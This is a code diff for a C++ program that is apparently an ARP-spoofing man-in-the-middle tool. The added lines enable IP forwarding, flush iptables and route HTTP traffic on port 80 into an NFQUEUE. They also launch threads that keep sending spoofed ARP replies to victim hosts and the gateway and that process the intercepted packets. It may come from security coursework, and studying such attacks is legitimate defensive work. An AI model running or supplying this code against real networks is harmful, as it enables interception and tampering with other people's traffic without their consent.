@@ -17,9 +17,13 @@ int main (int argc, char **argv) {
   map<string, string> arp_table;
 
   // get gateway ip
-  char *cmd = new char[100];
-  strcpy(cmd, "echo `ip route | head -n 1 | awk '{print $3}'` > ./gate_ip");
-  system(cmd);
+  system("sysctl net.ipv4.ip_forward=1 > /dev/null");
+  // system("sysctl net.ipv4.conf.all.send_redirects=0 > /dev/null");
+  // system("sysctl net.ipv4.conf.all.secure_redirects=0 > /dev/null");
+  system("iptables -F");
+  system("iptables -F -t nat");
+  system("iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0");
+  system("echo `ip route | head -n 1 | awk '{print $3}'` > ./gate_ip");
 
   // read gate_ip to get gateway ip in char*
   char *gwip = new char[16];
@@ -37,32 +41,19 @@ int main (int argc, char **argv) {
       victims.push_back(it->first);
     }
   }
+  cout << '\n';
 
-  // get my ip and mac
-  // uint32_t my_ip;
-  // int ifindex;
-  //unsigned char my_mac[6];
-  //get_if_info(ifname.c_str(), &my_ip, my_mac, &ifindex);
+  // create thread to keep sending arp reply 
   unsigned char *gw_mac = new unsigned char[6];
   str2mac(arp_table[gwip].c_str(), gw_mac);
-  // thread_reply(ifname.c_str(), victims, arp_table, gw_mac, inet_addr(gwip));
   thread t1 = thread(thread_reply, ifname.c_str(), victims, arp_table, gw_mac, inet_addr(gwip));
-  t1.join();
 
-  // thread thrds2vct[victims.size()];
-  // thread thrds2gw[victims.size()];
-  
-  // // create thread to send arp reply to spoof victim and gateway
-  // for(uint i = 0; i < victims.size(); i++) {
-  //   unsigned char *vctm_mac = new unsigned char[6];
-  //   str2mac(arp_table[victims[i]].c_str(), vctm_mac);
-  //   thrds2vct[i] = thread(thread_reply, ifindex, my_mac, vctm_mac, inet_addr(gwip), inet_addr(victims[i].c_str()));
-  //   thrds2gw[i] = thread(thread_reply, ifindex, my_mac, gw_mac, inet_addr(victims[i].c_str()), inet_addr(gwip));
-  // }
-  // for(uint i = 0; i < victims.size(); i++) {
-  //   thrds2vct[i].join();
-  //   thrds2gw[i].join();
-  // }
+  // create thread to keep listening to packets and do filter
+  //thread t2 = thread(filter_thread, ifname.c_str());
+  thread t2 = thread(nfq_thread);
+
+  t1.join();
+  t2.join();
 
   return (EXIT_SUCCESS);
 }
